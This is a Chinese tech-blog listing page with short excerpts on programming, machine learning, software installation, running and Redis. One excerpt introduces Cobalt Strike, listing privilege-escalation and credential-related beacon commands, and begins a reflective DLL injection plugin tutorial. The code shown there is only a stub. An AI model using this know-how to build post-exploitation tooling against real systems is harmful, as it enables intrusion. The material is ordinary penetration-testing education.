import os import openai from dotenv import load_dotenv, find_dotenv # 读取本地/项目的环境变量。 # find_dotenv()寻找并定位.env文件的路径 # load_dotenv()读取该.env文件，并将其中的环境变量加载到当前的运行环境中 # 如果你设置的是全局的环境变量，这行代码则没有任何作用。 _ = load_dotenv(find_dotenv()) # 如果你需要通过代理端口访问，你需要如下配置 os.environ['HTTPS_PROXY'] = 'http://127.0.0.1:7890' os.environ["HTTP_PROXY"] = 'http://127.0.0.1:7890' # 获取环境变量 OPENAI_API_KEY openai.api_key = os.environ['OPENAI_API_KEY'] 使用OpenAI原生接口调用 # 获取环境变量 OPENAI_API_KEY openai.api_key = os.environ['OPENAI_API_KEY'] # 创建ChatCompletion completion = openai.ChatCompletion.create( model="gpt-3.5-turbo", # 调用ChatGPT3.5 messages=[ {"role": "system", "content": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f8b16b09b01cc16dc70784fda52dcbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cd01f9c745aed688b105b74894e24e4/" rel="bookmark">
			【c&#43;&#43;】左值和右值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		理解 C/C++ 中的左值和右值 写得很好 简单定义 左值(lvalue, locator value) 表示一个占据内存中某个可识别得位置（地址）得对象右值(rvalue), 不是左值就是右值， 不表示内存中某个可识别位置的对象的表达式。 举例：
int var; var = 4; 赋值操作需要左操作数是一个左值。但是：
1 = var; (var + 1) = 4; 常量4 和 var + 1 都不是左值，因此不能赋值。
又一个例子
int globalvar = 20; int&amp; foo() { return globalvar; } int main() { foo() = 10; return 0; } 这里 foo 返回一个引用。引用一个左值，因此可以赋值给它。实际上，C++ 中函数可以返回左值的功能对实现一些重载的操作符非常重要。一个常见的例子就是重载方括号操作符 []，来实现一些查找访问的操作，如 std::map 中的方括号：
std::map&lt;int, float&gt; mymap; mymap[10] = 5.6; 之所以能赋值给 mymap[10]，是因为 std::map::operator[] 的重载返回的是一个可赋值的引用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cd01f9c745aed688b105b74894e24e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/013c504d045e15bc8945e144dc89e692/" rel="bookmark">
			信息、信息量、信息熵、互信息、基尼系数、信息增益、KL散度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		能消除不确定性的内容才能叫信息
信息量的公式：
熵是平均意义上对随机变量的编码长度，即信息量的期望：
例如抛硬币和掷骰子的熵：
在计算机中表示抛硬币结果需要1 bit，表示掷骰子结果需要log6 bit（实际向上取整3 bit）
必然事件的熵是0，必然事件没有不确定性，不含有信息量；信息越有用信息熵越大，不可为负数。同时也代表信息的压缩大小，一段话里面有重复的，把重复的去掉就等于压缩，压缩的极限就是信息熵。
信息熵是在信息的基础上，将有可能产生的信息定义为一个随机变量，
那么变量的期望就是信息熵，比如有两个取值，两个都有自己的信息，
分别乘以概率再求和，就得到了事情的信息熵：
信息增益是决策树中 ID3 算法用来特征选择的方法，
用整体的信息熵减掉按某一特征分裂后的条件熵，结果越大说明此特征越能消除不确定性，
最极端的情况，按这个特征分裂后信息增益与信息熵一模一样，则该特征就能获得唯一结果。
条件熵：
信息增益率是在信息增益的基础上，增加一个选取的特征包含的类别的惩罚项，
主要是考虑到信息增益会导致包含类别越多的特征的信息增益越大，
极端一点有多少个样本，这个特征就有多少个类别，那么就会导致决策树非常浅
基尼系数也是衡量信息不确定性的方法，与信息熵计算的结果差距很小，基本可以忽略，
但是基尼系数要计算快得多，因为没有对数；
与信息熵一样，当类别概率趋于平均时，基尼系数越大
互信息：
如抛硬币100次，90次为正，10词为负，其信息熵为
而正常抛硬币的信息熵应该是1，这里的差值为0.531，就是互信息；推导互信息的公式：
H(X)表示为原随机变量的信息量， H(X|Y)为知道事实 Y后的信息量，
互信息 I(X;Y)则表示为知道事实 Y 后，原来信息量减少了多少。 如果随机变量 X, Y独立，则互信息是0，即知道事实Y 并没有减少 X的信息量，独立即互不影响。
KL散度：
P(x)为正式样本分布，Q(x)代表预测样本分布。
KL散度越小，表示与P(x)更加接近，可以通过反复训练Q(x)来使Q(x)的分布逼近P(x)。
三分类任务，X1，X2，X3 分别代表猫，狗，马图片，一张猫的图片真实分布P(X)=[1,0,0]，预测分布Q(X)=[0.7,0.2,0.1]，计算KL散度：
参考：
决策树①——信息熵&amp;信息增益&amp;基尼系数_cindy407的博客-CSDN博客_决策树信息熵
https://zhuanlan.zhihu.com/p/36192699
【Deep Learning】Softmax和交叉熵损失函数_pangpd的博客-CSDN博客_softmax 交叉熵
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d54d027a530182da71209f646a5f921/" rel="bookmark">
			【GCN】GCN学习笔记一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		谱域图卷积 卷积 卷积定义离散空间的卷积 图卷积简介 卷积定理谱域图卷积实现思路如何定义图上的傅里叶变换拉普拉斯矩阵 （Laplacian Matrix）拉普拉斯矩阵的性质拉普拉斯矩阵的谱分解拉普拉斯矩阵与拉普拉斯算子 图傅里叶变换 图上的信号表示经典傅里叶变换特征向量基的性质 总结三个经典图谱卷积模型 SCNNChebNetGCN 谱域图卷积 卷积 卷积定义 卷积是分析数学中一种重要的运算，设 f ( x ) f(x) f(x) 和 g ( x ) g(x) g(x) 是 R \mathbb{R} R 上的可积函数，连续形式的卷积定义如下：
∫ − ∞ ∞ f ( τ ) g ( x − τ ) d τ (1) \int_{-\infin} ^{\infin} f(\tau) g(x - \tau) d\tau {\tag{1}} ∫−∞∞​f(τ)g(x−τ)dτ(1)
不同的函数和不同的卷积核可以的到不同的卷积结果。
离散空间的卷积 y n = x ∗ w = ∑ k = 1 k w k x n − k (2) y_n = x * w = \sum_{k=1}^k w_k x_{n-k} \tag{2} yn​=x∗w=k=1∑k​wk​xn−k​(2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d54d027a530182da71209f646a5f921/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adc666ad8841c99c637d0f2ef165a677/" rel="bookmark">
			文件上传学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 本地存储简陋的存储方式 第三方服务阿里云OSS通用思路使用配置&amp;简陋的使用正式开发 本地存储 简陋的存储方式 public Result upload(String name, Integer age, MultipartFile image) throws Exception{ log.info("文件上传：{},{},{}",username,age,image); //在控制台显示出相关数据 String originalFilename = image.getOriginalFilename(); image.transferTo(new File("目录"+originalFilename)); return Result.success(): } 该代码中通过上传的方式获取到了一个文件，并将这个文件放在了一个目录之中
目录可以填写想要存储于其中的位置，并将上传的文件以原本的文件名进行重新的一个cv创建
那么此时可以推断出一个问题，就是上传文件名相同的文件会出现后来的文件覆盖前面相同文件名的文件，此时就要引入一个文件命的命名方式：
uuid：通用唯一识别码，是一个长度固定的字符串，用于构造唯一的文件名 那如何生成一个不会重复的一个字符串呢
String uuid = UUID.randomUUID().toString(); 这个不重复的字符串出来之后呢，是没有我们要的文件的后缀名的，只是个文件的名字，没加上文件的类型，所以我们需要手动拼接上
我觉得有两种方式解决拼接
是直接自己加上。(虽然感觉不是很规范，但是可以用不同的接口方法，在端口设置方法的时候分开不同类型的，上传不同的东西应该也是不同的功能，所以可以直接加上）是获取出来文件的后缀名。（通过拿到最后一个.之后的内容，进行拼接） String extname = originalFilename.substring(originalFilename.lastIndexOf(","); );
String newFileName = UUID.randomUUID().toString() + extname; 到了这时候大致的代码如下所示
public Result upload(MultipartFile image) throws IOException{ //获取原始文件名 String originalFilename = image.getOriginalFilename(); //构建新的文件名 String newFileName = UUID.randomUUID().toString + originalFilename.substring(originalFilename.lastIndexOf(",")); //将文件保存在服务器端目录下 image.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adc666ad8841c99c637d0f2ef165a677/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e200c9a71dbdd827b736f90d1b0b359/" rel="bookmark">
			03. Python中的语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、前言 在《Python基础数据类型》一文中，我们了解了Python中的基础数据类型，今天我们继续了解下Python中的语句和函数。
2、语句 在Python中常用的语句可以大致分为两类：条件语句、循环语句。
2.1、条件语句 条件语句就是我们编码时常见的逻辑判断语句，条件语句由if else/else if组成。
2.1.1、单条件判断 比如：学生分数，根据是否大于等于60分，判断是否成绩合格。单条件语法为：
if 条件表达式: 执行语句... else: 执行语句... 具体Python实现：
if __name__ == '__main__': # 由于这里input默认为字符串，而分数通常为数字类型，这里用int进行数据类型转换 score = int(input("请输入学习成绩：")) if score &gt;= 60: print("输入成绩为：", score, "，成绩及格") else: print("输入成绩为：", score, "，成绩不及格") 2.1.2、多条件判断 比如：学生分数，大于等于80为优秀，60-80之间为良好，60以下为不及格。多条件语法为：
if 条件表达式1: 执行语句... elif 条件表达式2: 执行语句... elif 条件表达式3: 执行语句... else: 执行语句... 具体Python实现：
if __name__ == '__main__': # 由于这里input默认为字符串，而分数通常为数字类型，这里用int进行数据类型转换 score = int(input("请输入学习成绩：")) if score &gt;= 80: print("输入成绩为：", score, "，成绩优秀") elif 80 &gt; score &gt;= 60: print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e200c9a71dbdd827b736f90d1b0b359/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4df115124c481715adfeeff9dd0594db/" rel="bookmark">
			Windows10下Tomcat8.5安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.首先查看是否安装JDK。2.下载3.解压到指定目录（安装路径）4.启动Tomcat5.常见问题5.1.如果出现报错或者一闪而过5.2.Tomcat乱码 1.首先查看是否安装JDK。 CMD窗口输入命令
java -version
2.下载 历史版本下载地址：https://archive.apache.org/dist/tomcat/
tomcat和java关系表：https://tomcat.apache.org/whichversion.html
下载的时候需要对应自己的JDK版本
3.解压到指定目录（安装路径） D:\installSoft\apache-tomcat-8.5.96
4.启动Tomcat 在D:\installSoft\apache-tomcat-8.5.96\bin下，双击startup.bat启动，如图
启动成功。
5.常见问题 5.1.如果出现报错或者一闪而过 可能是端口号被占用。Tomcat默认窗口时8080。
Windows下进入CMD窗口，使用netstat -aon|findstr 8080查看。
可以尝试重启电脑，再启动Tomcat试试。不行的话，就修改Tomcat端口号。
5.2.Tomcat乱码 参考链接：https://www.cnblogs.com/Fooo/p/16994064.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c8df95cc5805bd9822d0c681d66535f/" rel="bookmark">
			如何利用VS2022编写代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.打开VS2022
会看到这个界面，然后点击创建新项目。2.点击空项目，然后点击下一步。
3.创建项目
4.进去之后，会有一个解决方案资源管理器，没有也不要担心。
5.
6.
7.
8.然后就可以写代码了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b510cd6b8e7b194af7f645ebb8a16d0/" rel="bookmark">
			【使用vscode在线web搭建开发环境--code-server搭建】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官方版本下载 https://github.com/coder/code-server/releases?q=4.0.0&amp;expanded=true使用大于版本3.8.0,因为旧版本有插件市场不能访问的情况版本太高需要更新环境依赖 拉取安装包 []# wget "https://github.com/coder/code-server/releases/download/v4.0.0/code-server-4.0.0-linux-amd64.tar.gz" []# tar -xvzf code-server-4.0.0-linux-amd64.tar.gz 配置账号密码 export PASSWORD="lijiacai" # 环境变量中设置密码 []# vim ~/.config/code-server/config.yaml bind-addr: 127.0.0.1:8081 auth: password password: 6705e7bca8485030e4633c0b cert: false # https开关 后台启动运行 ./code-server-4.0.0-linux-amd64/bin/code-server --port 8081 --host 0.0.0.0 ./readme/ 备注 出现报错 Failed to set 'pythonPath'. Error: Unable to write to Folder Settings because no resource is provided. 修复不能切换环境问题（请在项目中添加）
[]# mkdir .vscode []# cat .vscode/settings.json { "python.pythonPath": "/usr/bin/python3.8" } 启动问题 Unable to connect to VS Code server: Error in request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b510cd6b8e7b194af7f645ebb8a16d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fedc55404b8dac88e4a2cf4fdfd642f0/" rel="bookmark">
			DIY百元级激光雕刻机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		心血来潮，折腾开始 购买硬件【百元内】 硬件功能Arduino uno/esp32 *1开发板Arduino CNC Shield V3.0 *1扩展板A4988驱动板电机驱动板光驱 *2为了拆解，获取里面的驱动电机250nm激光头 *1、散热 *1激光雕刻用电烙铁、螺丝刀、工具钳、螺丝等工具 硬件照片：
Arduino esp32 开发板
Arduino CNC Shield V3.0扩展板
A4988驱动板
激光头,散热已经固定在架子上
搭建完成效果图：
参考教程：
Grbl_Esp32【github】
arduino-esp32【github】
Arduino UNO开发板、Arduino CNC Shield V3.0扩展板、A4988驱动板、grbl固件使用教程
Arduino CNC电机扩展板详解（A4988驱动42步进电机）
激光雕刻机：废旧光驱的涅槃之路
DIY迷你激光雕刻机
diy激光雕刻机教程【B站】
刷入Grbl B站教程
刷入FluidNC B站教程【可不看，直接看文章】
下载 github下载
使用说明书【维基百科】
上传 以版本3.6.8为例，下载压缩包进行解压
把esp32板子插在电脑上，点击运行wifi版本，
官网的解释：
无线或蓝牙
ESP32 不能同时做 wifi 和蓝牙，因为只有一个无线电。两者都占用大量代码空间，因此我们有 2 个版本的预编译固件（wifi 和 bt）。安装您计划使用的那个。如果您自己编译，您仍然可以选择 noradio 和 wifibt 选项。
系统会自己编译：
然后选择让自己对应的端口，如果不知道那个端口，打开电脑设备管理器
我的端口是COM3
这就代表已经上传成功了！！！
打开电脑的wifi，重新选择wifi
密码默认12345678
连接成功后会默认打开网页，如果没有打开了可以点击wifi下的
或者打开网页链接
来张网页全身照片
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fedc55404b8dac88e4a2cf4fdfd642f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c43536d57749e396790aa363d40ae01b/" rel="bookmark">
			QT专栏1 -Qt安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#本文时间2023年11月18日，Qt 6.6#
Qt 安装简要说明：
Qt有两个版本一个是商业版本（收费），另一个是开源版本（免费）；
打开安装程序时，通过判断账号是否有公司，安装商业版，还是开源版。账号注册时，一定要注意勾选个人，不能填写公司信息，下面注册账号中特别提到。
Qt安装分为3个过程，下载安装器 -&gt; 注册Qt账号-&gt;安装
1：下载安装器 Qt官网（https://www.qt.io/）下载在线下载器
step1，点击Download try
step2：选择下载开源版本，注意不要点击商业版，否者会让你注册一个商业账号。
step3：下载在线安装器 step4：根据PC环境，选择不同的在线安装器 2：注册账号 Step1：下载好安装器后，双击安装器，点击注册
Step2：输入账号密码，点击下一步等待，注册邮箱收到Qt的邮件
Step3：点开Qt邮件，点击确认链接，跳转注册信息填写页面
Step4：填写注册信息，注意需要勾选下面的选择框，否者不能安装开源版本
3：安装 Step1：注册好账号后，再次回到安装器，输入账号密码，进入下面界面
Step2：点击下一步
Step2：是否帮助改善，根据个人喜欢选择
Step3：出现安装环境，选择安装路径以及定制安装
Step4：选择QtDesign Studio与Qt
Step5：勾选同意协议许可，下一步
一直下一步，等待安装完成即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79042228a92ee19e88368db92f9837e9/" rel="bookmark">
			AI语音克隆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 下载安装github代码库
git clone https://github.com/Plachtaa/VITS-fast-fine-tuning.git 安装文档
中日语言模型网站
目前支持的任务:
从 10条以上的短音频 克隆角色声音从 3分钟以上的长音频（单个音频只能包含单说话人） 克隆角色声音从 3分钟以上的视频（单个视频只能包含单说话人） 克隆角色声音通过输入 bilibili视频链接（单个视频只能包含单说话人） 克隆角色声音 本地运行和推理 python VC_inference.py --model_dir ./OUTPUT_MODEL/G_latest.pth --share True 这个时候在本地的浏览器打开网址
http://localhost:7860 就可以看到语音tts的使用界面，但这只能在本地电脑能看到，如果要在远程的电脑上访问，可以使用cpolar
cpolar http 7860 这个时候就会出现一个访问的网址链接。
本地训练 1.创建conda运行环境
conda create -n tts python=3.8 2.安装环境依赖
pip install -r requirements.txt 在这个过程中，有一部分安装包，比如OpenAI的whisper代码包，可能因为网络问题，而无法访问，无法使用pip进行网络安装。可以在其它地方，单独下载好代码包，然后使用pip单独安装本地包。
3.安装GPU版本的PyTorch
# CUDA 11.6 pip install torch==1.13.1+cu116 torchvision==0.14.1+cu116 torchaudio==0.13.1 --extra-index-url https://download.pytorch.org/whl/cu116 # CUDA 11.7 pip install torch==1.13.1+cu117 torchvision==0.14.1+cu117 torchaudio==0.13.1 --extra-index-url https://download.pytorch.org/whl/cu117 4.安装视频模块包
pip install imageio==2.4.1 pip install moviepy 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79042228a92ee19e88368db92f9837e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb53441ef28efff42e2a60f08e280672/" rel="bookmark">
			【尚跑】马拉松冬训指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、长跑冬训 俗话说：冬练三九，夏练三伏；得冬训者，得PB。冬季跑步有什么好处？总结为以下几点
提升心肺功能。寒冷的环境增加心脏跳动频率，能加速新陈代谢与血液循环。
增加脂肪代谢。有氧运动会消耗身体的糖原，冬天运动需要耗能产生更多的热量来维持身体体温，运动时间长了会消耗身体脂肪来提供能量，脂肪代谢的效果更好。
更易拉长时间。夏季跑步气温高，体温提升快，血液加速循环出汗来散热，长距离跑下来浑身是汗心率也高。冬季跑步心率低，出汗量少，更易跑长距离。
磨练跑者意志。低温跑步如同冬泳一样会磨练跑者意志，合理的跑步装备保证温度适宜，走出舒适区，出门跑个步吧。
冬季是提高跑者心肺功能、肌肉力量、身体素质的绝佳时期。
2、马拉松训练原则 马拉松是以有氧运动为基础的运动，60%的跑量处在有氧跑阶段，练到什么程度，就能比到什么程度，常见的马拉松比赛中，在30KM\35KM撞墙就是长距离有氧跑（30KM以上）跑得不够多。
你的目的是为了锻炼身体，跑量不宜过大，一般遵循跑一休一的原则，不宜天天跑，跑前跑后做好拉伸，穿好保温的跑步装备
你的目的是为了参加马拉松比赛，能够比较轻松的完全完赛，需要比较系统的跑步，假如有一定的目标成绩，更需要系统全面的跑步训练。
3、马拉松备赛指导 备赛时间 ● 对于初次跑马者且无30KM以上长距离跑者，参加全程马拉松前需要具备6~8个月的持续性系统训练
● 对于长期坚持跑步的资深跑友，需要3~6个月的系统训练
备赛跑量 ● 为全马而备赛，月跑量至少需要达到180-250公里，理想月跑量应当达到250-300公里；
● 为半马而备赛，月跑量至少需要达到120-180公里，理想月跑量应当达到180-250公里；
注：对于入门跑者，月跑量按照当月比上月多10%的跑量增加，且尽量保持周跑量比较相近，而非前两周跑的多，后两周不跑或者跑的极少的情况出现。
● 跑全马前的1-2个月至少应当跑过一次30-35公里；跑半马前的1-2个月至少应当跑过一次10-15公里；
4、冬训训练 冬天相比夏天，相同的运动量，人体损耗要少，而温度低、速度过快容易造成拉伤，所以冬天最适合进行大量中低强度有氧训练、是一年中跑量最大的时候，也是提高有氧耐力的关键时期。
一般来说，冬训是从11月开始，一直持续到次年3月底。整个冬训可以分解为三个周期，也就是每个周期为4-5周，3-4周上量，1周恢复调整。呈现一个波峰波谷训练状态，而不是一直都是大跑量。
业余选手，在冬训期间是几乎以有氧耐力为主 作为业余爱好者冬训提高有氧耐力水平，即使跑间歇，也是1K或者2K的长距离间歇，且速度不易过快，速度的提升也是建立在耐力的基础上。
在量和强度上，一定是量为先 单次跑步一定是量为先，先保证这个量。在增加跑量时，要注意循序渐进；在增量时要注意降低强度。
周末的长距离，要以中低强度去跑 在有氧跑的范围内去跑，也要跑有氧跑的中低强度。
如果增加一些强度的训练，冬季比较适合的是有氧在前，混氧在后 在一次跑步中，积攒了足量的有氧跑，后面才能增加一点渐加速的混氧跑。
混氧，是介于有氧和无氧之间的训练；从弱到强，从慢到快，从有氧到无氧，这是混氧训练的基本原则；跑到呼吸微微有些急促、心肺稍微有点顶就可以。
冬季跑步要重视力量练习 冬季跑步虽然以量为先，但都是中低强度，所以身体比较容易恢复。
每周进行2-3次力量训练，不仅能缓解跑步带来的疲劳，而且更有利于提高成绩
冬季跑步一定要注意准备活动 冬季气温低，人体的韧带、肌肉更僵硬一些，肌肉比较紧，粘滞性增加。跑前要做充分的静态拉、动态拉伸，前几公里慢跑进行身体激活，跑步后要进行静态拉伸，有条件的用筋膜枪、泡沫轴进行肌肉的放松。
冬训长跑心率控制在轻松跑的低心率 30岁以下的跑者，轻松跑一般心率不超过150，最多160；30岁~40岁的跑者，轻松跑一般心率不超过140，最多150。
只需要有氧慢跑堆跑量就足够了。如果想追求成绩，那么冬天得有几次比马拉松配速慢10-15秒左右的长距离，来弥补后半程耐力不足。
5、力量训练 在冬训初期，专业的马拉松运动员除了强化基础耐力，也会进行充分的力量训练，一方面肌肉力量对于跑步本身就非常重要，另一方面，适当的力量强化对于平衡LSD对于肌肉的消耗，预防损伤，提升跑步经济性也发挥重要作用。
6、冬季跑步应该怎么穿？ 冬季跑步，怎么穿成为了很多跑友面临的第一个难题。穿少了难以抵御寒冷的天气，穿多了又会觉得热，跑起来也不利落，平添了很多累赘。
冬季跑步三层穿衣法 最内层的功能是快速导汗 一般是轻便的涤纶或者是加绒的贴身衣服，不要穿纯棉，。
中间这一层的功能是保温 抓绒长袖或者紧身的衣服。特别要注意的是，脚踝、手腕这些容易进风的位置要收紧。
最外侧的功能是防风防雨
气温在0度以下，风比较大的情况下，可以穿防风的冲锋衣。风小的情况可以穿皮肤衣，羽绒背心等。
帽子、手套、脖套必备
这是因为有30%的热量都是从我们裸露的手部散失出去的，所以手套非常重要。
冬季穿衣注意事项 最里面的衣服要贴身
下面塞进裤子里，这样风不会自下而上往里灌；
防风
脖子上带魔术围巾，预防风从上向下钻入；
末端保暖
手套、帽子一定要带，这些地方末端循环血管少，带手套帽子可以保暖，阻止热量散失；
及时更换湿衣服，防止失温受凉
跑后先换掉湿衣服、再喝水、拉伸，所以出远门跑步，要带着干衣服；特别提醒，出远门要带2个帽子，一个跑的时候带，跑后帽子湿了，马上换上干帽子，不然湿头发见风很容易受凉；
出远门跑步准备一个厚外套
热身完了再脱外套，拉伸的时候穿上外套。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb53441ef28efff42e2a60f08e280672/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54bc61e442658480163fce84d95f65f1/" rel="bookmark">
			springboot项目yml文件中使用${}配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、传统写法 （1）配置服务启动端口 # 服务端口 server: port: 9898 （2）使用idea启动 （3）使用jar包启动 2、使用${}写法 格式：${自定义参数名:默认值}
作用： 项目启动时动态配置变量中的值，若没有指定值，则使用默认值。
（1）配置服务启动端口 # 服务端口 server: port: ${SERVER_PORT:9898} （2）配置启动端口 （2）使用idea启动 （3）使用jar包启动 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e0b908fc7eaa4ef44ac7ad1be0341e5/" rel="bookmark">
			轻松学会cobalt strike插件开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cobalt Strike简介 Cobalt Strike是一款美国RedTeam开发的渗透测试神器，常被业界人称为CS也被称为CS神器，在内网渗透中使用的频率较高。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能，是一款基于Java的渗透测试神器。
Cobalt Strike常用命令如下：
help: 查看可用命令。getuid: 获取当前用户的权限。getsystem: 获取system权限。getprivs: 获取当前beacon里面的所有权限（这个用户现在能干嘛）。net domain_trusts: 列出域之间的信任关系。net logons:查看现在在登录的用户。net share:查看共享。shell xxx: 在命令行中执行xxx命令。powerpick xxx:不通过powershell来执行命令 插件开发 直接步入主题，先讲cs的插件开发RDI（ReflectiveDLLInject）,cs提供bdllspawn方法来来反射dll执行代码。同时官方也提供了相关的使用文档和demo示例。Functions
我们直接下载提供的vs模版项目https://codeload.github.com/stephenfewer/ReflectiveDLLInjection/zip/refs/heads/master
之后就很简单了，vs打开项目直接编辑ReflectiveDll.c进行代码编写，我们这里接收命令行参数来进行弹窗打印
//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include &lt;string&gt;
#include &lt;shellapi.h&gt;
#pragma comment(lib, "Shell32.lib")
using namespace std;
std::string szargs;
std::wstring wszargs;
std::wstring wsHostFile;
int argc = 0;
LPWSTR* argv = NULL;
extern HINSTANCE hAppInstance;
wstring StringToWString(const string&amp; str)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e0b908fc7eaa4ef44ac7ad1be0341e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7b4e8f13e731c9c49842e9f4458cd4f/" rel="bookmark">
			Redis学习笔记17：基于spring data redis及lua脚本批处理scan指令查询永久有效的key
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis的KEYS和SCAN指令都可以用于在数据库中搜索匹配指定模式的键。然而，它们之间有一些关键的区别；
KEYS指令会在整个数据库中阻塞地执行匹配操作，并返回匹配的键列表。如果数据库很大，或者匹配的键很多，将会对性能产生负面影响。而SCAN指令通过游标的方式逐步迭代数据库，每次返回一小部分匹配的键，不会阻塞数据库，可以在不影响其它操作的情况下进行遍历。
KEYS指令会返回匹配的键列表，这可能会导致返回的结果集很大，可能会占用大量的内存。而SCAN指令每次返回一小部分匹配的键，并通过游标来迭代，可以有效的处理大型结果集。
一个对springboot redis框架进行重写，支持lettuce、jedis、连接池、同时连接多个集群、多个redis数据库、开发自定义属性配置的开源SDK
&lt;dependency&gt; &lt;groupId&gt;io.github.mingyang66&lt;/groupId&gt; &lt;artifactId&gt;emily-spring-boot-redis&lt;/artifactId&gt; &lt;version&gt;4.4.0&lt;/version&gt; &lt;/dependency&gt; GitHub地址：https://github.com/mingyang66/spring-parent
一、基于SCAN指令批量查询TTL永久有效的lua脚本 -- 游标位置 local cursor = tonumber(ARGV[1]) -- 一次查询出的数量 local count = tonumber(ARGV[2]) -- 匹配模式 local pattern = '*' -- SCAN cursor [MATCH pattern] [COUNT count] 迭代数据库中的数据库键 local value = redis.call('SCAN', cursor, 'MATCH', pattern, 'COUNT', count) -- 下次循环的游标 local nextCursor = value[1] -- 当前批次的数据 local data = value[2] -- 符合条件的数据集合 local result = {} for i, key in ipairs(data) do -- 查询键对应过期时间 local ttl = redis.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7b4e8f13e731c9c49842e9f4458cd4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e08160910398d2bd70c9e5111fdcbc59/" rel="bookmark">
			Redis学习笔记16：基于spring data redis及lua脚本通过TTL查询永久有效的key
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis做为一个缓存服务，个人觉得不应该存在有永久有效的数据，要检索一个存在很久的redis服务器中存在哪些永久有效的key，可以通过lua脚本的方式实现；
一个对springboot redis框架进行重写，支持lettuce、jedis、连接池、同时连接多个集群、多个redis数据库、开发自定义属性配置的开源SDK
&lt;dependency&gt; &lt;groupId&gt;io.github.mingyang66&lt;/groupId&gt; &lt;artifactId&gt;emily-spring-boot-redis&lt;/artifactId&gt; &lt;version&gt;4.4.0&lt;/version&gt; &lt;/dependency&gt; GitHub地址：https://github.com/mingyang66/spring-parent
一、TTL过期时间为-1的lua脚本 local success, result = pcall(function() -- 获取所有键 local keys = redis.call('KEYS','*') -- 初始化表 local result = {} for i, key in ipairs(keys) do -- 获取键的过期时间 local ttl = redis.call('TTL', key) if ttl == -1 then -- 在table的数组部分指定位置(pos)插入值为value的一个元素. pos参数可选, 默认为数组部分末尾. table.insert(result, key) end end return result end) if success then return result else return result end 首先通过KEYS指令查询所有的键值，然后循环列表，通过TTL指令获取键值的过期时间，如果过期时间为-1，则将键值添加进列表，最后返回给客户端。
二、spring data redis实现脚本加载并执行 /** * @param redisTemplate redis 模板工具类 * @return TTL为-1的键集合列表 */ public static List&lt;String&gt; ttlKeys(RedisTemplate redisTemplate) { if (StringUtils.
	</div>
	<div class="list__footer clearfix">
